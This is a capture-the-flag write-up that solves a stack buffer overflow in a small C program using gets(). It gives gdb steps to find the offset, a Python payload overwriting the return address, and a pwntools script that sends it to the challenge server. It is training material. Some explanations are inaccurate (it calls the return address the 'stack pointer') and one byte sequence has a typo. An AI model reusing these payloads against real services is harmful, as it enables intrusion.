# This outta be large enough right?

## Description

> Come in, B-Team,
>
> We've identified an OmniFlags service that seems to be running on a satelite somewhere. We were able to get a copy of the program, and we suspect that it may be exploitable for identifying a flag. See if you can find it.
>
> Over & out,\
> HQ\
>
>
> `nc srv1.2023.magpiectf.ca 6201`

## Too Small

We are given a `chall.c` source code file

```c
#include <stdio.h>
#include <stdlib.h>
__asm__(".symver realpath,realpath@GLIBC_2.0.5");
void win(){
    printf("Here is your flag:\n");
    exit(0);
}
void vuln(){
  char buf[56];
  gets(buf);
}
int main(){
  vuln();
  return 0;
}
```

Here we can see the program makes a call to `vuln()`, which creates a character buffer and takes in input to fill the buffer, then returns 0. It's clear that we want to call `win()` in order to get our flag, so how shall we do that?

The code implies a buffer overflow attack

{% hint style="info" %}
**Buffer Overflow** - Occurs when the volume of data exceeds the storage capacity of the memory buffer, which overruns the buffer's allocated memory and overwrites adjacent memory locations
{% endhint %}

In the code `chall.c` we can see a buffer of static size 56 allocated, called `buf`. User input is then placed inside this buffer with `gets(buf)`. However, what if the user input exceeds the size `buf` was allocated for? Then those values will be stored in the next slots of memory, after the locations that were allocated by `buf`, which may overwrite important information.

One of these important pieces of information is the stack pointer, which points to the next instruction that the program should execute.&#x20;

Thus, our goal is

1. Overwrite the memory location the stack pointer is currently pointing to
2. Change it so it points at `win`
3. Profit.

First let's make the local executable `chall` executable by setting permissions

```
chmode +x chall
```

Then let's run it with gdb using `gdb chall`

First let's look into the functions of the file

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

We can see that the `win` function is located at 0x08048486. Let's put a pin in that for now, and run the program with `run`

Now, for the user input we want to overflow `buf`. It doesn't matter what dummy values we use, so let's send in "A"'s until we get a segmentation fault. Since we know the buffer has size 56, let's try 100 "A"s first, which we can send in using inline Python code

```
run <<< $(python3 -c 'print("A"*100)')
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

We got a segmentation fault, as expected. However, what's notable is the `0x41414141 in ?? ()` response. This is telling us where the program is currently, when it received the segmentation fault, so the `0x41414141` is the stack pointer and `?? ()` is the function the program faulted at.

If you have a good memory, you may recall none of the functions were even close to this location, and the function we ended at is unknown by the program.

If you have a keen eye, you may notice that 0x41 is "A" in hexadecimal.

Putting these together, we can note that not only did we cause a segmentation fault, we also managed to overwrite the stack pointer with "AAAA"

Unfortunately, we want to overwrite the stack pointer with "08048486", the location of `win`, so let's try finding the precise number of "A"s to send such that we cause a segmentation fault, however we do not overwrite the stack pointer.

To spare the painful details, this amounts to 68 "A"s

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption><p>So close to greatness</p></figcaption></figure>

If you wanted to, doing 69 or more "A"s will cause 41 to seep into the stack pointer from the right. The reason why it comes in from the right is because it is in little endian

{% hint style="info" %}
**Little Endian** - The least sygnificant byte of the data is placed at the byte with the lowest address
{% endhint %}

So instead of 08 03 84 86 we get 86 84 04 08

We are now ready to overwrite the stack pointer with our desired location. Note that the payload needs to be in bytes, so it looks something like this

```python
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\x86\x84\x04\x08")'
```

<figure><img src="../../.gitbook/assets/image (2) (3).png" alt=""><figcaption><p>We win!</p></figcaption></figure>

"Here is your flag:" is printed out, implying we successfully called `win`

## Let Me In

I tried to directly pipe in my Python payload into the netcat command

```python
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*68 + b"\x86\x84\x04\x08")' | nc srv1.2023.magpiectf.ca 6201
```

Unfortunately, it didn't work as the program would just hang. I similarly tried to send the Python to a file `out` and pipe in `cat out | nc srv1.2023.magpiectf.ca 6201` which did not work either.

I had the correct payload, but I just couldn't send the payload in!

After a bout of frustration, I settled down and coded up a Python script to communicate with the server

```python
from pwn import *

address = 'srv1.2023.magpiectf.ca'
port = 6201
tcpsocket = remote(address, port)

payload = "A"*68 + "\x86\x84\x04\x08"

tcpsocket.sendline(payload.encode('latin-1'))
print('Sent: 0x' + binascii.hexlify(payload.encode('latin-1')).decode('latin-1'))

print((tcpsocket.recvline()).decode('latin-1')) # Receive line after string is entered
print((tcpsocket.recv()).decode('latin-1')) # Receive the flag
```

## Flag

`magpie{0mn1_fl4g_3v3rywh3r3}`
